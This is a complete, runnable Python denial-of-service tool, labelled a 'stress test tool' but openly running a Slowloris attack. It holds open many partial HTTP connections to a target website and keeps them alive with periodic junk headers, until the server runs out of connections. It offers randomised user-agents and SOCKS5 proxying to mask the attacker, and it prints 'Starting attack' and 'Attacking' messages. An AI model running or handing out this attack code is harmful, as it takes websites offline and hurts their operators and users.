#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import os
import json
import requests
import sys
import time

GREEN = "\033[5;32m"
RED = "\033[5;31m"
BLUE = "\033[5;34m"
YELLOW = "\033[5;33m"
END = "\033[0;0m"

API = 'https://httpbin.org/ip'

print("    _ _____ ___  __  __ ___ ___  ")
print("   /_\_   _/ _ \|  \/  |_ _/ __| ")
print("  / _ \| || (_) | |\/| || | (__  ")
print(" /_/ \_\_| \___/|_|  |_|___\___| ")
print(" copyright (C) 2019 Byte Inject")
time.sleep(1)
print("\n")

parser = argparse.ArgumentParser(description="Atomic, low bandwidth stress test tool for websites")
parser.add_argument('--url', nargs="?", help="Host to perform stress test on")
parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument('-s', '--sockets', default=1024, help="Number of sockets to use in the test", type=int)
parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
parser.add_argument('--proxy-host', default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument('--proxy-port', default="8080", help="SOCKS5 proxy port", type=int)
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=True)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.url:
    print("[ "+YELLOW+"!"+END+" ] Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("[ "+GREEN+"+"+END+" ] Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("[ "+RED+"-"+END+" ] Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
else:
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 99999)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    print("[ "+GREEN+"+"+END+" ] Initializing...")
    time.sleep(1)
    print("[ "+GREEN+"+"+END+" ] Receiving metadata...")
    time.sleep(1)

    get = requests.get(API)
    myip = json.loads(get.text)

    filter = 'http://ip-api.com/json/'+myip['origin']
    content = requests.get(filter)
    metadata = json.loads(content.text)

    time.sleep(2)
    print("[ "+GREEN+"+"+END+" ] METADATA:")
    print("\t[ "+RED+"-"+END+" ] IP: "+str(myip['origin']))
    print("\t[ "+RED+"-"+END+" ] ISP: "+str(metadata['isp']))
    print("\t[ "+RED+"-"+END+" ] City: "+str(metadata['city']))
    print("\t[ "+RED+"-"+END+" ] Region: "+str(metadata['region']))
    print("\t[ "+RED+"-"+END+" ] Zone: "+str(metadata['timezone']))
    print("\t[ "+RED+"-"+END+" ] Country: "+str(metadata['country']))
    print("\t[ "+RED+"-"+END+" ] Lat: "+str(metadata['lat']))
    print("\t[ "+RED+"-"+END+" ] Lon: "+str(metadata['lon']))
    print("\t[ "+RED+"-"+END+" ] ZIP: "+str(metadata['zip']))
    print("\n")
    dec = str(input("[ "+YELLOW+"!"+END+" ] Continue attack? (y/N) "))

    if(dec == "N"):
         sys.exit(1)

    ip = args.url
    socket_count = args.sockets
    print("\n")
    print("[ "+GREEN+"+"+END+" ] Starting attack")
    time.sleep(1)
    print("[ "+GREEN+"+"+END+" ] Attacking "+ip)
    time.sleep(1)
    print("[ "+GREEN+"+"+END+" ] Injecting bytes")
    time.sleep(1)
    print("[ "+GREEN+"+"+END+" ] Creating sockets")
    time.sleep(1)
    for _ in range(socket_count):
        try:
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        try:
            print("[ "+YELLOW+"!"+END+" ] Injecting packets...")
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 99999)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                print("[ "+GREEN+"+"+END+" ] Recreating socket...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    break
            time.sleep(15)

        except (KeyboardInterrupt, SystemExit):
            print("\nStopping Slowloris...")
            break

if __name__ == "__main__":
    main()
